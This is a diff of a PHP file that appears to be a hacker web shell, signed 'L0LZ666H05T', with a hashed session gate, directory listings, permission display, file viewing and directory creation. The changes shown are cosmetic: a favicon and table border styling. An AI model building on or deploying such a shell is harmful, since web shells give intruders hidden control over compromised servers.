@@ -54,6 +54,7 @@ if (!isset($_SESSION[md5($_SERVER['HTTP_HOST']) ])) {
   }
 }
 ?>
+<link rel="shortcut icon" href="https://pngimage.net/wp-content/uploads/2018/05/admin-png-6.png" type="image/x-icon" >
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
 <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
@@ -73,7 +74,7 @@ if (!isset($_SESSION[md5($_SERVER['HTTP_HOST']) ])) {
 	} a {
 		color:#fff;
 		text-decoration:none;
-	} table, tr, td {
+	} tr, td {
 		border-collapse:collapse;
 		border-spacing:0;
 		border:1px solid green;
@@ -611,7 +612,7 @@ if (@$_POST['do'] == 'makedir') {
 	<?php
 }
 ?>
-<table width="90%" align="center">
+<table width="90%" align="center" border="0">
 		</th>
 	</tr>
 	<tr>
@@ -655,41 +656,41 @@ foreach (@scandir(@cwd()) as $dir) {
 		</center>';
 	}
 	?>
-	<tr class="hover"><td>
+	<tr class="hover" style="border:none;"><td style="border:none;">
 	<img class="icon" src="http://icons.iconarchive.com/icons/custom-icon-design/flatastic-1/256/folder-icon.png">
 	<a href='?dir=<?php print @cwd().SEP.$dir ?>'><?php print $dir ?></a></td>
-	<td>
+	<td style="border:none;">
 		<center>
 			--
 		</center>
 	</td>
-	<td>
+	<td style="border:none;">
 		<center>
 			<?php print @writable($dir, @perms($dir)) ?>
 		</center>
 	</td>
-	<td style="width:200px;">
+	<td style="width:200px;border:none;">
 		<?php print $action ?>
 	</td>
 	<?php
 }
 foreach (@scandir(@cwd()) as $file) {
 	if (!is_file($file)) continue;
-	?><tr class="hover"><td>
+	?><tr class="hover" style="border:none;"><td style="border:none;">
 	<img class="icon" src="https://pngimage.net/wp-content/uploads/2018/06/file-png-12.png">
 	<a href='?action=view&dir=<?php print @cwd()."&file=".@cwd().SEP.$file ?>'><?php print $file ?></a>
 	</td>
-	<td>
+	<td style="border:none;">
 		<center>
 			<?php print @size($file) ?>
 		</center>
 	</td>
-	<td>
+	<td style="border:none;">
 		<center>
 			<?php print @writable($file, @perms($file)) ?>
 		</center>
 	</td>
-	<td style="width:200px;">
+	<td style="width:200px;border:none;">
 		<center>
 <form method="post" action="?dir=<?php print @cwd() ?>">
 <div class="input-group mb-3">
@@ -708,7 +709,7 @@ foreach (@scandir(@cwd()) as $file) {
 	<?php
 }
 ?>
-<tr>
+<tr style="border:none;"> 
 	<th colspan="4">
 		&copy; L0LZ666H05T - <?php print @date("Y") ?>
 	</th>
